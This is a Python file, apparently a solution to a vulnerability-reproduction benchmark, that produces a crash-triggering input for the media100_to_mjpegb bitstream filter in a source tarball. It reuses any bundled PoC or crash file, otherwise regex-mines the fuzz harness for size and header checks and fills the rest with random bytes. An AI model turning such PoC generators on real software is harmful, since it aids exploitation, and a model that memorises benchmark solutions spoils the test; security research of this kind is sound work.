import os
import re
import tarfile
import tempfile
import shutil
import random


class Solution:
    def solve(self, src_path: str) -> bytes:
        def find_existing_poc(path: str):
            try:
                with tarfile.open(path, 'r:*') as tar:
                    members = tar.getmembers()
                    candidates = []
                    for m in members:
                        if not m.isfile():
                            continue
                        name = m.name.lower()
                        if any(k in name for k in ('poc', 'testcase', 'crash', 'repro')):
                            if 0 < m.size < 1_000_000:
                                candidates.append(m)
                    if candidates:
                        best = min(candidates, key=lambda x: x.size)
                        f = tar.extractfile(best)
                        if f:
                            data = f.read()
                            if data:
                                return data
            except Exception:
                pass
            return None

        existing = find_existing_poc(src_path)
        if existing is not None:
            return existing

        def eval_const_expr_simple(expr: str, byte_width: int, endian: str):
            expr = expr.strip()
            m = re.match(r'MK(BE)?TAG\s*\(\s*\'(.?)\'\s*,\s*\'(.?)\'\s*,\s*\'(.?)\'\s*,\s*\'(.?)\'\s*\)', expr)
            if m:
                chars = [ord(ch) for ch in m.groups()[1:]]
                return chars[:byte_width]
            if re.fullmatch(r'(0x[0-9a-fA-F]+|\d+)', expr):
                try:
                    val = int(expr, 0)
                except Exception:
                    return None
                bs = []
                for i in range(byte_width):
                    if endian == 'little':
                        bs.append((val >> (8 * i)) & 0xFF)
                    else:
                        bs.append((val >> (8 * (byte_width - 1 - i))) & 0xFF)
                return bs
            return None

        # Fallback if tar can't be opened
        try:
            tmpdir = tempfile.mkdtemp(prefix="src_")
        except Exception:
            return b'\x00' * 2048

        try:
            try:
                with tarfile.open(src_path, 'r:*') as tar:
                    tar.extractall(tmpdir)
            except Exception:
                return b'\x00' * 2048

            harness_text = None
            bsf_text = None

            harness_files = []
            media100_files = []

            for root, dirs, files in os.walk(tmpdir):
                for fn in files:
                    if not fn.endswith(('.c', '.cc', '.cpp', '.cxx')):
                        continue
                    path = os.path.join(root, fn)
                    try:
                        with open(path, 'r', errors='ignore') as fh:
                            txt = fh.read()
                    except Exception:
                        continue
                    if 'LLVMFuzzerTestOneInput' in txt:
                        harness_files.append((path, txt))
                    if 'media100_to_mjpegb' in txt:
                        media100_files.append((path, txt))

            if harness_files:
                for p, txt in harness_files:
                    if 'media100_to_mjpegb' in txt:
                        harness_text = txt
                        break
                if harness_text is None:
                    harness_text = harness_files[0][1]

            for p, txt in media100_files:
                if p.endswith('.c'):
                    bsf_text = txt
                    break
            if bsf_text is None and media100_files:
                bsf_text = media100_files[0][1]

            # If we couldn't find any relevant source, fall back
            if harness_text is None and bsf_text is None:
                return b'\x00' * 2048

            # Analyze harness for size constraints
            min_size = 1
            max_size = 65536  # default upper bound

            if harness_text is not None:
                size_cond_pat = re.compile(
                    r'if\s*\(\s*size\s*([<>]=?)\s*(0x[0-9a-fA-F]+|\d+)\s*\)'
                )
                for m in size_cond_pat.finditer(harness_text):
                    op, val_str = m.groups()
                    try:
                        val = int(val_str, 0)
                    except Exception:
                        continue
                    if op == '<':
                        if val > min_size:
                            min_size = val
                    elif op == '<=':
                        if val + 1 > min_size:
                            min_size = val + 1
                    elif op == '>':
                        if val < max_size:
                            max_size = val
                    elif op == '>=':
                        if val - 1 < max_size:
                            max_size = val - 1

            if min_size <= 0:
                min_size = 1
            if max_size < min_size:
                max_size = min_size + 1024

            # Analyze BSF for packet-size constraints and header bytes
            byte_map = {}
            filter_min_size = 1

            if bsf_text is not None:
                size_cond_pat2 = re.compile(
                    r'->\s*size\s*([<>]=?)\s*(0x[0-9a-fA-F]+|\d+)'
                )
                for m in size_cond_pat2.finditer(bsf_text):
                    op, val_str = m.groups()
                    try:
                        val = int(val_str, 0)
                    except Exception:
                        continue
                    if op == '<':
                        if val > filter_min_size:
                            filter_min_size = val
                    elif op == '<=':
                        if val + 1 > filter_min_size:
                            filter_min_size = val + 1

                lines = bsf_text.splitlines()

                # Direct AV_Rxx comparisons
                av_cmp_pat = re.compile(
                    r'AV_R([BL])(\d+)\s*\(\s*([^)]+)\s*\)\s*([!=]=)\s*([^)\n;]+)'
                )

                addr_pat = re.compile(
                    r'(\w+)(?:\s*(?:->\s*data|\[\s*0\s*\]))?(?:\s*\+\s*(0x[0-9a-fA-F]+|\d+))?'
                )

                for line in lines:
                    if ('AV_RL' not in line and 'AV_RB' not in line) or 'if' not in line:
                        continue
                    if 'return' not in line and 'goto' not in line:
                        continue
                    m = av_cmp_pat.search(line)
                    if not m:
                        continue
                    endian_ch, bits_str, addr_expr, op, const_expr = m.groups()
                    try:
                        bits = int(bits_str)
                    except Exception:
                        continue
                    byte_width = bits // 8
                    endian = 'little' if endian_ch == 'L' else 'big'
                    addr_expr = addr_expr.strip()
                    offset = 0
                    madd = addr_pat.match(addr_expr)
                    if madd:
                        off_str = madd.group(2)
                        if off_str:
                            try:
                                offset = int(off_str, 0)
                            except Exception:
                                offset = 0
                    const_bytes = eval_const_expr_simple(const_expr, byte_width, endian)
                    if const_bytes is None:
                        continue
                    for i, b in enumerate(const_bytes):
                        pos = offset + i
                        if pos not in byte_map:
                            byte_map[pos] = b & 0xFF

                # AV_Rxx assignments to variables, then variable-based gating
                av_assign_pat = re.compile(
                    r'(\w+)\s*=\s*AV_R([BL])(\d+)\s*\(\s*([^)]+)\s*\)\s*;'
                )
                var_info = {}
                for m in av_assign_pat.finditer(bsf_text):
                    vname, endian_ch, bits_str, addr_expr = m.groups()
                    try:
                        bits = int(bits_str)
                    except Exception:
                        continue
                    byte_width = bits // 8
                    endian = 'little' if endian_ch == 'L' else 'big'
                    addr_expr = addr_expr.strip()
                    offset = 0
                    madd = addr_pat.match(addr_expr)
                    if madd:
                        off_str = madd.group(2)
                        if off_str:
                            try:
                                offset = int(off_str, 0)
                            except Exception:
                                offset = 0
                    var_info[vname] = {
                        'offset': offset,
                        'endian': endian,
                        'bits': bits,
                        'bytes': byte_width,
                    }

                gate_lines = [
                    ln for ln in lines if 'if' in ln and ('return' in ln or 'goto' in ln)
                ]

                for vname, vinfo in var_info.items():
                    width_bits = vinfo['bits']
                    maxv = (1 << width_bits) - 1
                    low = 0
                    high = maxv
                    forbidden = set()
                    eq_val = None
                    vpat = re.compile(
                        r'\b%s\s*([<>!=]=?)\s*(0x[0-9a-fA-F]+|\d+)' % re.escape(vname)
                    )
                    for ln in gate_lines:
                        for mm in vpat.finditer(ln):
                            op, val_str = mm.groups()
                            try:
                                c = int(val_str, 0)
                            except Exception:
                                continue
                            if op == '<':
                                if c > low:
                                    low = c
                            elif op == '<=':
                                if c + 1 > low:
                                    low = c + 1
                            elif op == '>':
                                if c < high:
                                    high = c
                            elif op == '>=':
                                if c - 1 < high:
                                    high = c - 1
                            elif op == '==':
                                forbidden.add(c)
                            elif op == '!=':
                                eq_val = c
                    if low > high:
                        continue
                    if eq_val is not None and low <= eq_val <= high and eq_val not in forbidden:
                        chosen = eq_val
                    else:
                        chosen = low
                        while chosen in forbidden and chosen <= high:
                            chosen += 1
                        if chosen > high:
                            continue
                    bw = vinfo['bytes']
                    val = chosen
                    for i in range(bw):
                        if vinfo['endian'] == 'little':
                            b = (val >> (8 * i)) & 0xFF
                            off = vinfo['offset'] + i
                        else:
                            b = (val >> (8 * (bw - 1 - i))) & 0xFF
                            off = vinfo['offset'] + i
                        if off not in byte_map:
                            byte_map[off] = b

                # Simple data[index] comparisons
                simple_pat = re.compile(
                    r'\b(?:data|buf|src|dst)\s*\[\s*(0x[0-9a-fA-F]+|\d+)\s*\]\s*([!=]=)\s*(0x[0-9a-fA-F]+|\d+)'
                )
                for ln in lines:
                    if 'if' not in ln or ('return' not in ln and 'goto' not in ln):
                        continue
                    for mm in simple_pat.finditer(ln):
                        idx_str, _op, val_str = mm.groups()
                        try:
                            idx = int(idx_str, 0)
                            val = int(val_str, 0) & 0xFF
                        except Exception:
                            continue
                        if idx not in byte_map:
                            byte_map[idx] = val

            base_min = max(min_size, filter_min_size, 1)
            if max_size < base_min:
                max_size = base_min + 1024
            if max_size > 1_000_000:
                max_size = 1_000_000

            size = base_min + 32
            if size > max_size:
                size = max(base_min, max_size)

            if byte_map:
                max_off = max(byte_map.keys())
                if size <= max_off:
                    size = max_off + 32
                    if size > max_size:
                        size = max_off + 1
            if size < 1:
                size = 1

            # Build PoC data
            data = bytearray(size)
            # Slight randomness to avoid too-trivial buffers
            for i in range(size):
                data[i] = random.randint(0, 255)

            for off, val in byte_map.items():
                if 0 <= off < size:
                    data[off] = val

            return bytes(data)
        finally:
            try:
                shutil.rmtree(tmpdir, ignore_errors=True)
            except Exception:
                pass